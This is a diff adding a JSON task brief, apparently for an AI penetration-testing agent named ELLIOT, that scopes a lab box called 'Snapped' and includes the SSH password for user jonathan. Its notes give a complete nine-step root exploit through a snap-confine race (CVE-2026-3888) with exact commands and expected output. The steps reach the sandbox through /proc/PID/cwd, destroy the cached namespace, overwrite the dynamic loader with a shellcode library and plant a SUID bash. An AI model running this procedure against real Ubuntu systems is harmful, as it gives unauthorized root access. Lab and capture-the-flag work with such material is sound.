@@ -1,0 +1,51 @@
+{
+  "operation": "Snapped",
+  "timestamp": "2026-03-26T00:20:00Z",
+  "phase": "EXPLOITATION",
+  "elliot_authorized": true,
+  "scope": {
+    "objective": "Escalate from jonathan to root via CVE-2026-3888. Read /root/root.txt.",
+    "in_scope": [
+      "SSH as jonathan (password: linkinpark) via remote_exec/remote_upload",
+      "Uploading pre-compiled exploit binaries (already cross-compiled)",
+      "Running snap-confine directly to enter/destroy sandbox",
+      "Using /proc/PID/cwd to access sandbox /tmp from outside",
+      "Racing snap-confine mimic creation via AF_UNIX backpressure",
+      "Dynamic linker hijacking on SUID snap-confine",
+      "Sandbox escape via SUID bash in /var/snap/firefox/common/"
+    ],
+    "out_of_scope": "Do not modify system services beyond snap namespace manipulation.",
+    "stop_conditions": [
+      "Root shell obtained — read /root/root.txt",
+      "Exploit fails after 3 attempts — return with diagnostics",
+      "Budget exhausted"
+    ],
+    "max_attempts_per_path": 3,
+    "max_turns": 35
+  },
+  "context_files": [
+    "../shared/attack_surface.md",
+    "../shared/exploit_src/firefox_2404.c",
+    "../shared/exploit_src/librootshell.c"
+  ],
+  "primary_path": "CVE-2026-3888 snap-confine TOCTOU race. Pre-compiled binaries ready. Follow the 9-step procedure in notes.",
+  "backup_path": "If race helper fails to detect trigger: check that namespace was properly destroyed in step 4. If systemd-run fails: try without it. If SUID bash escape fails: try writing to /var/snap/firefox/common/ a different way.",
+  "vulnerability_primitive": {
+    "primitive": "TOCTOU race in snap-confine mimic creation. After /tmp/.snap is deleted by tmpfiles, attacker recreates it and swaps contents during bind-mount sequence using AF_UNIX backpressure to single-step snap-confine.",
+    "delivery_forms": [
+      "renameat2(RENAME_EXCHANGE) atomic swap of .snap/usr/lib/x86_64-linux-gnu during mimic bind-mount",
+      "Dynamic linker (ld-linux-x86-64.so.2) replacement with shellcode ELF",
+      "SUID bash at /var/snap/firefox/common/ for sandbox escape"
+    ],
+    "defenses_observed": "Cached namespace requires explicit destruction. /tmp/snap-private-tmp is 0700 root — bypassed via /proc/PID/cwd. AppArmor on snap-confine allows /var/snap/firefox/common/ writes.",
+    "untested_forms": ["All — first attempt with correct procedure"]
+  },
+  "complexity": "complex",
+  "process_model": {
+    "foreground": "Multiple SSH sessions (Terminal 1, 2, 3 pattern)",
+    "background": "Race helper keeps poisoned namespace alive",
+    "critical_note": "This exploit requires 3 concurrent terminal sessions. Use remote_exec for each. The race helper (Terminal 2/Step 5) must stay running — do NOT close it. Use nohup or background processes where needed."
+  },
+  "opsec_profile": "LOUD",
+  "notes": "=== EXACT 9-STEP EXPLOIT PROCEDURE (from official writeup) ===\n\nPRE-COMPILED BINARIES READY AT:\n  ../shared/exploit_src/firefox_2404   (race helper, static x86_64)\n  ../shared/exploit_src/librootshell.so (ld-linux replacement shellcode)\n\nSTEP 0 — Upload binaries to target:\n  Upload firefox_2404 and librootshell.so to ~/  on target (jonathan home dir)\n  chmod +x ~/firefox_2404\n\n=== TERMINAL 1 — Enter sandbox ===\n\nSTEP 1 — Enter the Firefox snap sandbox:\n  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash\n  cd /tmp\n  echo $$\n  (Note the PID, e.g. 18606)\n\nSTEP 2 — Wait for .snap deletion (already happened on this box):\n  The 1-minute tmpfiles timer with 4m age means .snap is already gone.\n  Verify: stat ./.snap → 'No such file or directory'\n  Keep /tmp alive: while test -d ./.snap; do touch ./; sleep 1; done\n  (Or just leave Terminal 1 sitting — the process keeps the namespace alive)\n\n=== TERMINAL 2 — Access sandbox /tmp from outside ===\n\nSTEP 3 — Use /proc/PID/cwd to bypass 0700 on snap-private-tmp:\n  cd /proc/<PID_FROM_STEP1>/cwd\n  ls -la\n  (Should show the sandbox's /tmp contents)\n\nSTEP 4 — Destroy the cached namespace (CRITICAL — this is what ELLIOT was missing):\n  systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash\n  Then inside that scope:\n  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent\n  Expected error: 'cannot perform operation: mount --rbind /dev ... No such file or directory'\n  The ERROR IS EXPECTED — the failure destroys the cached namespace.\n  The --base snapd (invalid base) triggers SC_DISCARD_MUST because the base snap NAME changes from core22 to snapd.\n  This forces namespace discard while Terminal 1's /tmp remains alive.\n\nSTEP 5 — Run the race helper (stay in /proc/PID/cwd):\n  ~/firefox_2404 ~/librootshell.so\n  Expected output:\n    [*] CVE-2026-3888 — firefox 24.04 helper\n    [*] Setting up .snap and .exchange directory...\n    [*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange\n    [*] Starting race against snap-confine...\n    [*] Reading snap-confine output (PID XXXX)...\n    [!] TRIGGER DETECTED! Swapping .exchange...\n    [+] SWAP DONE!\n  DO NOT CLOSE THIS TERMINAL — it keeps the poisoned namespace alive.\n\n=== TERMINAL 3 — Exploit the poisoned namespace ===\n\nSTEP 6 — Overwrite the dynamic loader:\n  PID=$(cat /proc/<STEP1_PID>/cwd/race_pid.txt)\n  cat /proc/<STEP1_PID>/cwd/race_perms.txt\n  (Should show: jonathan:jonathan 755 — confirming attacker ownership)\n  cd /proc/$PID/root\n  stat -c '%U:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n  (Should show: jonathan:jonathan)\n  cp /usr/bin/busybox ./tmp/sh\n  cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n\nSTEP 7 — Trigger root (execute SUID snap-confine in poisoned namespace):\n  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine\n  Result: BusyBox shell as uid=0(root)\n  Verify: id → uid=0(root) gid=1000(jonathan)\n\nSTEP 8 — Escape the sandbox:\n  cp /bin/bash /var/snap/firefox/common/bash\n  chmod 04755 /var/snap/firefox/common/bash\n  exit\n\nSTEP 9 — Full root on host:\n  /var/snap/firefox/common/bash -p\n  id → uid=1000(jonathan) gid=1000(jonathan) euid=0(root)\n  cat /root/root.txt\n\n=== KEY INSIGHTS ===\n\n1. WHY --base snapd DESTROYS THE NAMESPACE:\n   The info file at /run/snapd/ns/snap.firefox.info contains 'base-snap-name=core22'.\n   Running with --base snapd makes snap-confine see a base name TRANSITION (core22→snapd).\n   This triggers SC_DISCARD_MUST — forced namespace discard regardless of occupancy.\n\n2. WHY /proc/PID/cwd WORKS:\n   /proc/PID/cwd follows the process's mount namespace view.\n   It bypasses host filesystem permissions (the 0700 on snap-private-tmp).\n   This gives us read/write access to the sandbox's /tmp from outside.\n\n3. WHY THE RACE IS DETERMINISTIC:\n   AF_UNIX socket with SO_RCVBUF=1 and SO_SNDBUF=1 creates extreme backpressure.\n   snap-confine blocks on every write() to stderr.\n   The helper reads byte-by-byte, single-stepping snap-confine.\n   When trigger detected, snap-confine is FROZEN mid-write — unlimited time to swap.\n\n4. THE MULTI-TERMINAL REQUIREMENT:\n   Terminal 1: Keeps sandbox alive (process in namespace preserves /tmp)\n   Terminal 2: Destroys cached ns + runs race (must stay open after race)\n   Terminal 3: Exploits poisoned namespace\n   ELLIOT must use background processes or multiple remote_exec sessions."
+}
